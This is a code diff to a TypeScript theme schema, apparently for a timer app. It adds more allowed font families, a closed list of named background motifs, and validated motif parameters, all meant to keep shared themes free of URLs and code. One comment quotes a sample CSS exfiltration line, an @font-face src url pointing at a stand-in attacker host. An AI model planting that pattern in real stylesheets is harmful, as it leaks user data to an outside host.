@@ -62,9 +62,61 @@ const MAX_DIMENSION = 10000;
  * font, which is what would otherwise turn `fontFamily` into an exfiltration channel
  * (`@font-face { src: url(https://attacker/?…) }`).
  *
- * Every entry is an OFL-licensed variable font bundled under `public/fonts/`.
+ * Every entry is an OFL-licensed font bundled under `src/assets/fonts/` and declared in
+ * `styles/fonts.css`. The list is short on purpose: each family is a real download, so a
+ * name is added only when a theme needs the *character* of that typeface and not merely a
+ * different colour.
  */
-export const FONT_FAMILIES = ['manrope', 'instrument-serif', 'jetbrains-mono'] as const;
+export const FONT_FAMILIES = [
+  /** Neutral geometric sans — the app's default body face. */
+  'manrope',
+  /** High-contrast serif — the app's default display face. */
+  'instrument-serif',
+  /** Monospace with tabular figures — every number that ticks. */
+  'jetbrains-mono',
+  /** Literary, soft-serifed, slightly wonky: Van Gogh, Herbarium. */
+  'fraunces',
+  /** Eclectic display grotesque: Sakura Tree. */
+  'bricolage-grotesque',
+  /** Technical, wide, slightly mechanical: Terminal Amber. */
+  'space-grotesk',
+] as const;
+
+/* ------------------------------------------------------------------ *
+ * Motifs — the app-rendered background layers
+ * ------------------------------------------------------------------ */
+
+/**
+ * A theme may ask for a background motif. This is a closed list, and the closure is the
+ * whole point.
+ *
+ * Artwork cannot live *inside* a theme: a theme is a token document with no `url()`, no
+ * assets and no code, which is what makes opening a stranger's theme safe. So a motif is a
+ * **name** — a value from this list and nothing else. The app owns the renderer and the
+ * bytes for each name; the theme only chooses which one runs.
+ *
+ * Adding a motif means adding a renderer in `app/ambience/`. A name with no renderer falls
+ * back to `none` rather than breaking, so an older build meeting a newer theme still paints.
+ */
+export const MOTIFS = [
+  'none',
+  /** Curl-noise advection over the real *Starry Night*. Van Gogh. */
+  'starry-flow',
+  /** Drafting grid and tick marks. Terminal Amber. */
+  'terminal-grid',
+  /** A hearth whose glow follows the timer phase. Ember. */
+  'hearth',
+  /** Rain streaks mirrored at a horizon. Neon Rain. */
+  'neon-rain',
+  /** A seeded L-system tree with falling petals. Sakura Tree. */
+  'sakura-tree',
+  /** Ruled specimen-plate lines and a pressed silhouette. Herbarium. */
+  'specimen',
+  /** Crystal growth anchored at the edges. Frost. */
+  'frost-growth',
+] as const;
+
+export type Motif = (typeof MOTIFS)[number];
 
 /* ------------------------------------------------------------------ *
  * Aliases
@@ -237,6 +289,18 @@ const EffectsSchema = z
     motion: z.number().min(0).max(2).optional(),
     /** Backdrop blur on elevated surfaces, in px. */
     blur: z.number().min(0).max(40).optional(),
+
+    /* Motif parameters. These shape the background layer named by `motif`; they do nothing
+       on their own, so a theme can leave all of them out and still be complete. */
+    /** How strongly the motif draws, 0–1. Zero switches it off without changing `motif`. */
+    ambience: z.number().min(0).max(1).optional(),
+    /** Element count, 0–1. Each motif maps this onto its own sensible range. */
+    density: z.number().min(0).max(1).optional(),
+    /** Motif scale, 0.2–3. Geometry, not decoration: a sapling versus a full tree. */
+    scale: z.number().min(0.2).max(3).optional(),
+    /** Seeds every deterministic motif. The same seed draws the same tree on every load —
+     *  a background that rearranges itself each visit reads as a bug, not as character. */
+    seed: z.number().int().min(0).max(999_999).optional(),
   })
   .strict();
 
@@ -263,6 +327,8 @@ export const ThemeSchema = z
   .object({
     $schema: z.string().optional(),
     ...MetadataSchema.shape,
+    /** Which app-rendered background motif this theme asks for. A name, never a source. */
+    motif: z.enum(MOTIFS).optional(),
     tokens: z
       .object({
         color: ColorTokens,
